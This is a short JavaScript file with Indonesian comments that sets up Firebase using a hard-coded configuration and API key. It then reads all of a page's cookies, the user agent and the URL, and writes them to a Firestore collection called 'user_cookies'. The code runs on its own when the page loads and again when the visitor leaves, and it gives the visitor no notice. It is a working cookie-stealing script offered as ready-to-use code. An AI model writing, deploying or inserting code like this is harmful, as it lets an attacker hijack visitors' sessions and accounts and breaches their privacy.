// script.js
import { initializeApp } from 'https://www.gstatic.com/firebasejs/12.5.0/firebase-app.js';
import { getFirestore, doc, setDoc } from 'https://www.gstatic.com/firebasejs/12.5.0/firebase-firestore.js';

// Konfigurasi Firebase - GANTI DENGAN MILIK ANDA
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyDUGI__AYHk5DPxmWGHI5iFM55wmXGgyLo",
  authDomain: "akun-tmate.firebaseapp.com",
  databaseURL: "https://akun-tmate-default-rtdb.firebaseio.com",
  projectId: "akun-tmate",
  storageBucket: "akun-tmate.firebasestorage.app",
  messagingSenderId: "1076327760751",
  appId: "1:1076327760751:web:c76ef435fbb1f14421de9a",
  measurementId: "G-PM7TH4XKQK"
};

// Inisialisasi Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Generate user ID sederhana
const getUserId = () => {
    let userId = localStorage.getItem('cookie_user_id');
    if (!userId) {
        userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('cookie_user_id', userId);
    }
    return userId;
};

// Ambil semua cookies
const getAllCookies = () => {
    const cookies = {};
    document.cookie.split(';').forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        if (name && value) cookies[name] = decodeURIComponent(value);
    });
    return cookies;
};

// Simpan cookies ke Firebase
const saveCookiesToFirebase = async () => {
    try {
        const userId = getUserId();
        const cookies = getAllCookies();
        
        await setDoc(doc(db, 'user_cookies', userId), {
            cookies: cookies,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href
        }, { merge: true });
        
        console.log('✅ Cookies berhasil disimpan ke Firebase');
    } catch (error) {
        console.error('❌ Gagal menyimpan cookies:', error);
    }
};

// Jalankan otomatis ketika halaman dimuat
document.addEventListener('DOMContentLoaded', () => {
    setTimeout(saveCookiesToFirebase, 1000);
});

// Simpan juga ketika user meninggalkan halaman
window.addEventListener('beforeunload', saveCookiesToFirebase);

// Export fungsi jika perlu digunakan manual
export { saveCookiesToFirebase, getAllCookies };
